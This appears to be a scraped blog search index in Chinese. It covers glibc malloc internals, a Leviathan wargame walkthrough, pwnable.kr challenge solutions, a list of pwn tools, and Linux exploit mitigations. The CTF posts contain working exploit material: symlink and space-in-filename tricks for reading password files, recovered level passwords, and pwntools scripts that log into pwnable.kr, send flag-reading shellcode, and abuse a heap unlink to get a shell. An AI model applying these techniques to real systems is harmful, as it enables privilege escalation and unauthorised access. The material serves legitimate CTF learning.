MAX_TCACHE_COUNT 127\t/* Maximum value of counts[] entries. */mallocstatic void* _int_malloc(mstate, size_t); 如果size &lt; max_fast，在fast bins中寻找fast chunk，如找到则结束 如果size in_smallbin_range，在small bins中寻找small chunk，如找到则结束 循环 检查unsorted bin中的last_remainder，如果满足一定条件，则分裂之，将剩余chunk标记为新的last_remainder 在unsorted bin中搜索，同时进行整理，如遇到精确大小，则返回，否则就把当前chunk整理到small/large bin中去 在small bin和large bin中搜索最合适的chunk 使用top chunkmallocfreestatic void _int_free(mstate, mchunkptr, int); 如果size &lt; max fast，放入fast bin，结束 如果前一个chunk是free unlink前面的hunk 合并两个chunk，并放入unsorted bin 如果后一个chunk是top chunk，则将当前chunk并入top chunk 如果后一个chunk是free unlink后面的chunk 合并两个chunk，并放入unsorted bin 前后chunk都不是free，放入unsorted binfree调用流程__libc_mallocglibc通过别名机制将malloc映射到__libc_mallocstrong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, malloc)libc malloc流程 mstate ar_ptr指向全局内存分配器的指针，说白了就是全局内存分配器状态机。 atomic_forced_read 是汇编语句，用于原子读操作，每次只会读取一次。例如调用malloc_hook_ini初始化只会调用一次//malloc.cvoid *__libc_malloc (size_t bytes){ mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;}libc_hidden_def (__libc_malloc)hook//malloc.cvoid weak_variable (*__free_hook) (void *__ptr, const void *) = NULL;void *weak_variable (*__malloc_hook) (size_t __size, const void *) = malloc_hook_ini;void *weak_variable (*__realloc_hook) (void *__ptr, size_t __size, const void *) = realloc_hook_ini;void *weak_variable (*__memalign_hook) (size_t __alignment, size_t __size, const void *) = memalign_hook_ini;void weak_variable (*__after_morecore_hook) (void) = NULL; 第一个同malloc的size参数，第二个参数是调用malloc的那个函数的地址 __malloc_hook相当于给malloc函数套了一层外壳，当这个函数指针的值不为NULL时，系统在调用malloc是就会触发这个hook，执行hook所指向的函数malloc_hook_ini 主要用于初始化全局状态机+chunk的数据结构//hook.cstatic void *malloc_hook_ini (size_t sz, const void *caller){ __malloc_hook = NULL; ptmalloc_init (); return __libc_malloc (sz);}ptmalloc_init 初始化全局内存分配器的状态机 通过__malloc_initialized全局变量，来记录初始化的状态。0=未初始化，1-初始化。如果已经初始化，则直接返回 main_arena是全局内存分配器状态机的主线程结构，数据结构：mstate malloc_init_state是核心初始化mstate状态机数据结构static voidptmalloc_init (void){ if (__malloc_initialized &gt;= 0) return; __malloc_initialized = 0;#ifdef SHARED /* In case this libc copy is in a non-default namespace, never use brk. Likewise if dlopened from statically linked program. */ Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (ptmalloc_init, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) __morecore = __failing_morecore;#endif thread_arena = &amp;main_arena;// 初始化主分配区数据#if HAVE_TUNABLES......malloc_consolidate (&amp;main_arena);#else......#endif#if HAVE_MALLOC_INIT_HOOK void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)();#endif __malloc_initialized = 1;}malloc_init_state malloc_init_state是核心初始化mstate状态机数据结构 初始化中由malloc_consolidate调用 fastbin中支持的fastchunk的默认最大值为128字节。在glibc中用“DEFAULT_MXFAST”宏定义表示 支持的fastchunk的数据空间最大为160字节。在glibc中用“MAX_FAST_SIZE”宏定义表示 初始化top chunk，默认指向了unsorted bin上的第一个chunk 将bins进行初始化，生成bins数组#ifndef DEFAULT_MXFAST#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)#endif#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)static voidmalloc_init_state (mstate av){ int i; mbinptr bin; /* Establish circular links for normal bins */ for (i = 1; i &lt; NBINS; ++i) { bin = bin_at (av, i); bin-&gt;fd = bin-&gt;bk = bin; }#if MORECORE_CONTIGUOUS if (av != &amp;main_arena)#endif set_noncontiguous (av); if (av == &amp;main_arena) set_max_fast (DEFAULT_MXFAST); av-&gt;flags |= FASTCHUNKS_BIT; av-&gt;top = initial_top (av);}bins相关#define NBINS 128#define NSMALLBINS 64#define SMALLBIN_WIDTH MALLOC_ALIGNMENT#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)/* addressing -- note that bin_at(0) does not exist */#define bin_at(m, i) \\ (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))\t\t\t \\ - offsetof (struct malloc_chunk, fd))/* analog of ++bin */#define next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))/* Reminders about list directionality within bins */#define first(b) ((b)-&gt;fd)#define last(b) ((b)-&gt;bk)chunk相关 chunk2mem：chunk的起始地址转换到用户内存mem地址。chunk起始地址在低地址，所以通过加上2*SIZE_SZ的方式，转换到高地址的mem地址指针 mem2chunk：用户内存mem地址转换到chunk的起始地址。用户内存mem地址在高地址，所以通过减去2*SIZE_SZ的方式，转到低地址的chunk的起始地址 MIN_CHUNK_SIZE：最小的chunk大小。通过offsetof 函数计算出fd_nextsize 在 malloc_chunk 中的偏移，至少包含mchunk_prev_size、mchunk_size、fd、bk四个地址的空间量。所以64位系统，最小是32字节（48）；32位系统，最小是16字节（44） aligned_OK：检查内存是否对齐。64位系统按照16字节对齐，32位系统按照8字节对齐 request2size：通过对齐后，实际chunk的大小。如果内存大小小于MINSIZE，则使用MINSIZE空间；否则通过MALLOC_ALIGN_MASK进行字节对齐。/* conversion from malloc headers to user pointers, and back */#define chunk2mem(p) ((void*)((char*)(p) + 2*SIZE_SZ))#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))/* The smallest possible chunk */#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))/* The smallest size we can malloc is an aligned minimal chunk */#define MINSIZE \\ (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))#define aligned_OK(m) (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)/* pad request bytes into a usable size -- internal version */#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) ? \\ MINSIZE : \\ ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)reference Understanding glibc malloc Vudo malloc tricks A Memory Allocator Understanding the GLIBC Heap Implementation GLibcHeapInternals libc2.26 之后的 Tcache 机制 glibc Tcache机制" }, { "title": "wargames刷题[Leviathan]", "url": "/posts/wargames%E5%88%B7%E9%A2%981/", "categories": "CTF, Exercise", "tags": "wargames", "date": "2022-09-07 10:10:00 +0800", "snippet": "leviathan0隐藏文件夹，ls -al就能看到bookmark.html。在里面搜索password即可，做题的时候没想到关键词是password。 PPIfmI1qsAleviathan132位程序验证密码，objdump简单看了下程序中明文存储了密码sex mEh5PNl10eleviathan2access函数检查用户对某文件的权限，程序中先用access判断后才执行/bin/cat。这样的方式存在绕过技术，大致的原理与空格相关测试一下就可以知道argv不会截断’\\ ‘，access会连带空格当成文件名，而snprintf生成的/bin.cat命令会按空格隔开#include &lt;stdio.h&gt;int main(int argc, char *argv[]){ printf(\"argc: %d\\n\", argc); for(int i = 0; i &lt; argc; i++) { printf(\"access: %d\\t\", access(argv[i], 0)); printf(\"argv: %s\\n\", argv[i]); } return 0;}root@HeFeng:~/workplace# ./main tes\\ targc: 2access: 0 argv: ./mainaccess: 0 argv: tes tleviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/backdoorleviathan2@gibson:~$ touch /tmp/\"backdoor passwd\"leviathan2@gibson:~$ ./printfile /tmp/backdoor\\ passwdQ0G8j4sakn/bin/cat: passwd: No such file or directoryif ( access(argv[1], 4) ) { puts(\"You cant have that file...\"); return 1; }else { snprintf(s, 0x1FFu, \"/bin/cat %s\", v6[1]); v4 = geteuid(); v5 = geteuid(); setreuid(v5, v4); system(s); return 0; } Q0G8j4saknleviathan3跟level1一样明文比较，没什么含金量 AgvropI4OAleviathan4用二进制形式直接输出了password，没啥好说的直接还原&gt;&gt;&gt;for i in s:... print(chr(int(i, 2)), end='')leviathan4@gibson:~$ ./.trash/bin01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010stream = fopen(\"/etc/leviathan_pass/leviathan5\", \"r\"); if ( !stream ) return -1; fgets(buf, 256, stream); for ( i = 0; strlen(buf) &gt; i; ++i ) { v4 = *(_BYTE *)(i + 134529120); for ( j = 0; j &lt;= 7; ++j ) { if ( v4 &gt;= 0 ) putchar(48); else putchar(49); v4 *= 2; } putchar(32); } putchar(10); EKKlTF1Xqsleviathan5直接软链接输出file.log即可，一开始一直关注unlink被带跑了。stream = fopen(\"/tmp/file.log\", \"r\"); if ( !stream ) { puts(\"Cannot find /tmp/file.log\"); exit(-1); } while ( 1 ) { v5 = fgetc(stream); if ( feof(stream) ) break; putchar(v5); } fclose(stream); v3 = getuid(); setuid(v3); unlink(\"/tmp/file.log\");leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.logleviathan5@gibson:~$ ./leviathan5YZ55XPVk2l YZ55XPVk2lleviathan6直接提权，没有任何难度。if ( argc != 2 ) { printf(\"usage: %s &lt;4 digit code&gt;\\n\", *argv); exit(-1); } if ( atoi(argv[1]) == 7123 ) { v3 = geteuid(); v4 = geteuid(); setreuid(v4, v3); system(\"/bin/sh\"); } else { puts(\"Wrong\"); } return 0; 8GpZ5f8Hzeleviathan7通关leviathan7@gibson:~$ cat CONGRATULATIONSWell Done, you seem to have used a *nix system before, now try something more serious.(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)" }, { "title": "pwnable.kr刷题[Toddler's Bottle(21/21)]", "url": "/posts/pwnable.kr%E5%88%B7%E9%A2%983/", "categories": "CTF, Exercise", "tags": "pwnable", "date": "2022-09-02 10:10:00 +0800", "snippet": "input对这种类型的题目不是很熟悉，看了别人的wp发现使用fork+pipe的方式在服务器运行c程序写入stderr区。而我自己做的部分用pwntools的process配置了argv和env，总体上而言做的很少。这题是抄的wp，自己做的话可能永远也做不出来…#include &lt;stdio.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(){ //argv char *argv[]={\"./input\",[1 ... 99]=\"A\",'\\0'}; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; argv['C']=\"55555\"; //stdio int fd1[2],fd2[2]; int ret1,ret2; //用来接受pipe函数的返回值 ret1=pipe(fd1); if(ret1==-1) { perror(\"pipe fd1 error:\"); exit(1); } ret2=pipe(fd2); if(ret2==-1) { perror(\"pipe fd2 error:\"); exit(1); } pid_t id=fork(); if(id==0) //子进程 { close(fd1[0]); close(fd2[0]); //关闭子进程读端 write(fd1[1],\"\\x00\\x0a\\x00\\xff\",4); write(fd2[1],\"\\x00\\x0a\\x02\\xff\",4); } else //父进程 { close(fd1[1]); close(fd2[1]); dup2(fd1[0],0); dup2(fd2[0],2);//文件描述符重定向 close(fd1[0]); close(fd2[0]); //env char *env[2]={\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\",NULL}; //file FILE *fp=fopen(\"\\x0a\",\"w\"); if(fp==NULL) printf(\"文件打开失败\\n\"); else { fwrite(\"\\x00\\x00\\x00\\x00\",4,1,fp); fclose(fp); execve(\"input\",argv,env); } } //network sleep(5); struct sockaddr_in server; int sockfd = socket(AF_INET,SOCK_STREAM,0); if(sockfd&lt;0) { perror(\"Cannot create the socket:\"); exit(1); } server.sin_family=AF_INET; server.sin_addr.s_addr=inet_addr(\"127.0.0.1\"); server.sin_port=htons(55555); if(connect(sockfd,(struct sockaddr*)&amp;server,sizeof(server))&lt;0) { perror(\"Problem connecting\"); exit(1); } printf(\"Connected\\n\"); char buf[4]=\"\\xde\\xad\\xbe\\xef\"; write(sockfd,buf,4); close(sockfd); return 0;}#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[]){ printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(\"bind error, use another port\\n\"); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(\"accept error, tell admin\\n\"); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0;}arm本来打算动态调试的，虽然qemu+gdb准备好了，但是gcc没法通过编译，报错也很奇怪，gcc -S得到的汇编也很奇怪，怀疑是汇编格式不支持。静态分析的话有些东西需要注意，比如arm的流水线架构。不论是三段式还是五段式，当前指令执行的时候PC指向的是下下条指令.arm的bx指令会根据最后一bit判断是否进入thumb状态，该状态与arm状态的不同之处在于指令长度变成了两字节。0x00008d00 &lt;+16&gt;和0x00008d0a &lt;+26&gt;处均发生了状态翻转。至于lr寄存器则是存储的当前函数返回地址(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;:\tpush\t{r4, r11, lr} 0x00008d40 &lt;+4&gt;:\tadd\tr11, sp, #8 0x00008d44 &lt;+8&gt;:\tsub\tsp, sp, #12 0x00008d48 &lt;+12&gt;:\tmov\tr3, #0 0x00008d4c &lt;+16&gt;:\tstr\tr3, [r11, #-16] 0x00008d50 &lt;+20&gt;:\tldr\tr0, [pc, #104]\t; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;:\tbl\t0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;:\tsub\tr3, r11, #16 0x00008d5c &lt;+32&gt;:\tldr\tr0, [pc, #96]\t; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;:\tmov\tr1, r3 0x00008d64 &lt;+40&gt;:\tbl\t0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;:\tbl\t0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;:\tmov\tr4, r0 0x00008d70 &lt;+52&gt;:\tbl\t0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;:\tmov\tr3, r0 0x00008d78 &lt;+60&gt;:\tadd\tr4, r4, r3 0x00008d7c &lt;+64&gt;:\tbl\t0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;:\tmov\tr3, r0 0x00008d84 &lt;+72&gt;:\tadd\tr2, r4, r3 0x00008d88 &lt;+76&gt;:\tldr\tr3, [r11, #-16] 0x00008d8c &lt;+80&gt;:\tcmp\tr2, r3 0x00008d90 &lt;+84&gt;:\tbne\t0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;:\tldr\tr0, [pc, #44]\t; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;:\tbl\t0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;:\tldr\tr0, [pc, #40]\t; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;:\tbl\t0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;:\tb\t0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;:\tldr\tr0, [pc, #32]\t; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;:\tbl\t0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;:\tmov\tr3, #0 0x00008db4 &lt;+120&gt;:\tmov\tr0, r3 0x00008db8 &lt;+124&gt;:\tsub\tsp, r11, #8 0x00008dbc &lt;+128&gt;:\tpop\t{r4, r11, pc} 0x00008dc0 &lt;+132&gt;:\tandeq\tr10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;:\tandeq\tr10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;:\t\t\t; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;:\t\t\t; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;:\tandeq\tr10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;:\tadd\tr11, sp, #0 0x00008cdc &lt;+8&gt;:\tmov\tr3, pc 0x00008ce0 &lt;+12&gt;:\tmov\tr0, r3 0x00008ce4 &lt;+16&gt;:\tsub\tsp, r11, #0 0x00008ce8 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;:\tbx\tlrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;:\tadd\tr11, sp, #0 0x00008cf8 &lt;+8&gt;:\tpush\t{r6}\t\t; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;:\tadd\tr6, pc, #1 0x00008d00 &lt;+16&gt;:\tbx\tr6 0x00008d04 &lt;+20&gt;:\tmov\tr3, pc 0x00008d06 &lt;+22&gt;:\tadds\tr3, #4 0x00008d08 &lt;+24&gt;:\tpush\t{r3} 0x00008d0a &lt;+26&gt;:\tpop\t{pc} 0x00008d0c &lt;+28&gt;:\tpop\t{r6}\t\t; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;:\tmov\tr0, r3 0x00008d14 &lt;+36&gt;:\tsub\tsp, r11, #0 0x00008d18 &lt;+40&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;:\tbx\tlrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;:\tpush\t{r11}\t\t; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;:\tadd\tr11, sp, #0 0x00008d28 &lt;+8&gt;:\tmov\tr3, lr 0x00008d2c &lt;+12&gt;:\tmov\tr0, r3 0x00008d30 &lt;+16&gt;:\tsub\tsp, r11, #0 0x00008d34 &lt;+20&gt;:\tpop\t{r11}\t\t; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;:\tbx\tlrEnd of assembler dump.memcpy题目要求顺利执行完自定义的memcpy，但总是会意外跳出，怀疑是自定义的memcpy存在问题。movdqa指令要求16字节对齐，而程序中又有src = malloc(size)。怀疑是32位程序的malloc，由于chunk为8字节，所以当前申请内存为16字节倍数时共计内存(8+16n)，会导致下一个块不按16字节对齐。char* fast_memcpy(char* dest, const char* src, size_t len){\tsize_t i;\t// 64-byte block fast copy\tif(len &gt;= 64){\t\ti = len / 64;\t\tlen &amp;= (64-1);\t\twhile(i-- &gt; 0){\t\t\t__asm__ __volatile__ (\t\t\t\"movdqa (%0), %%xmm0\\n\"\t\t\t\"movdqa 16(%0), %%xmm1\\n\"\t\t\t\"movdqa 32(%0), %%xmm2\\n\"\t\t\t\"movdqa 48(%0), %%xmm3\\n\"\t\t\t\"movntps %%xmm0, (%1)\\n\"\t\t\t\"movntps %%xmm1, 16(%1)\\n\"\t\t\t\"movntps %%xmm2, 32(%1)\\n\"\t\t\t\"movntps %%xmm3, 48(%1)\\n\"\t\t\t::\"r\"(src),\"r\"(dest):\"memory\");\t\t\tdest += 64;\t\t\tsrc += 64;\t\t}\t}\t// byte-to-byte slow copy\tif(len) slow_memcpy(dest, src, len);\treturn dest;}按如下的序列即可specify the memcpy amount between 8 ~ 16 : 8specify the memcpy amount between 16 ~ 32 : 24specify the memcpy amount between 32 ~ 64 : 40specify the memcpy amount between 64 ~ 128 : 72specify the memcpy amount between 128 ~ 256 : 136specify the memcpy amount between 256 ~ 512 : 264specify the memcpy amount between 512 ~ 1024 : 520specify the memcpy amount between 1024 ~ 2048 : 1032specify the memcpy amount between 2048 ~ 4096 : 2056specify the memcpy amount between 4096 ~ 8192 : 4104asm任意代码执行，由于开启了seccomp所以只能使用open、read、write和exit函数。很明显是打开文件读取之后写入stdout，使用shellcraft构造即可。stub处的代码用于将所有寄存器清零。chroot只改变当前进程的根目录，并不会改变进程工作目录。所以使用./可以打开文件，而/却并不能打开，同理/dev等访问方式也会失效。from pwn import *context.log_level = 'debug'context.arch = 'amd64'context.os = 'linux'myssh = ssh(user='asm', host='pwnable.kr', port=2222, password='guest')io = myssh.process(\"./asm\")io = myssh.remote(\"localhost\", 9026)stub = b'\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff'print(disasm(stub))file_name = \"./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\"payload = shellcraft.pushstr(file_name)payload += shellcraft.open('rsp')payload += shellcraft.read('rax', 'rsp', 0x60)payload += shellcraft.write(1, 'rsp', 0x60)payload = asm(payload)io.sendafter(\"give me your x64 shellcode:\", payload)io.interactive()#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox(){ scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) { printf(\"seccomp error\\n\"); exit(0); } seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0){ seccomp_release(ctx); printf(\"seccomp error\\n\"); exit(0); } seccomp_release(ctx);}char stub[] = \"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff\";unsigned char filter[256];int main(int argc, char* argv[]){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(\"Welcome to shellcoding practice challenge.\\n\"); printf(\"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n\"); printf(\"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n\"); printf(\"If this does not challenge you. you should play 'asg' challenge :)\\n\"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf(\"give me your x64 shellcode: \"); read(0, sh+offset, 1000); alarm(10); chroot(\"/home/asm_pwn\"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;}unlink利用unlink可以实现任意地址写，但如果直接令fd和bk分别指向stack和shellcode的话会因为写入代码段出错。所以我们利用main函数结束的指令来写入返回地址。这写指令会将[ebp-4]存入ecx，再将[ecx-4]写入esp，这样通过[[ebp-4]-4]我们劫持了栈指针 80485ff: 8b 4d fc mov -0x4(%ebp),%ecx 8048602: c9 leave 8048603: 8d 61 fc lea -0x4(%ecx),%esp 8048606: c3 ret stack+0x10指向的是ebp-4的位置，考虑到FD-&gt;bk要修正4字节的偏移才能正确写入ebp-4+------------+------------+ | prev_size | size |+------------+------------+ &lt;- A| buf | buf |+------------+------------+| shellcode | buf |+------------+------------+ | prev_size | size |+------------+------------+ &lt;- B| stack + 0xc| heap + 0xc |+------------+------------+| buf | buf |+------------+------------+from inspect import stackfrom socket import timeoutfrom pwn import *context.log_level = 'debug'myssh = ssh(user=\"unlink\", host=\"pwnable.kr\", port=2222, password=\"guest\")io = myssh.process(\"/home/unlink/unlink\")elf = ELF(\"./unlink\")stack_addr = int(re.findall(\"0x[a-f0-9]+\", io.recvline().decode())[0], base=16)heap_addr = int(re.findall(\"0x[a-f0-9]+\", io.recvline().decode())[0], base=16)print(hex(stack_addr))print(hex(heap_addr))payload = p32(elf.symbols['shell'])payload += b'a' * 0xcpayload += p32(stack_addr + 0x10 -0x4)payload += p32(heap_addr + 0xc)io.recvuntil(\"get shell\", timeout=1)io.sendline(payload)io.interactive()#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];}OBJ;void shell(){ system(\"/bin/sh\");}void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;}int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf(\"here is stack address leak: %p\\n\", &amp;A); printf(\"here is heap address leak: %p\\n\", A); printf(\"now that you have leaks, get shell!\\n\"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;}reference ARM-流水线" }, { "title": "小工具汇总", "url": "/posts/%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/", "categories": "CTF, PWN", "tags": "tools", "date": "2022-09-01 17:10:00 +0800", "snippet": "ROPGadgetrpropperxroproputilsone_gadgetzio-框架：接口简单易用Pwntools：Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等peda/pwndbg-gdb调试插件libheapLibcSearcherLibcSearcher-ngmain_arena_offset" }, { "title": "Linux保护机制", "url": "/posts/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/", "categories": "Linux, LinuxSecurity", "tags": "protection", "date": "2022-09-01 11:10:00 +0800", "snippet": " 即便漏洞存在，也让攻击者难以利用 操作系统或编译器提供 随机地址：ASLR、PIE 检测栈溢出：Stack Canary、Stack Cookie 栈不可执行：NX、W^X、DEPASLR 历史 用户栈随机化(2001) 内核栈随机化(2002) 堆随机化(2003) 由操作系统提供 PC/移动操作系统均已支持 大量IoT(Internet of Things)设备仍未启用 随机粒度为0x1000相当于一个内存页的大小 程序本身加载基址不变 动态库本身的加载地址一般固定，可以通过ldd查看 fs/binfmt_elf.c$ /proc/sys/kernel/randomize_va_space = 0$ /proc/sys/kernel/randomize_va_space = 1 # stack, library$ /proc/sys/kernel/randomize_va_space = 2 # stack, library, heapPosition Independent Executables(PIE) 由编译器提供 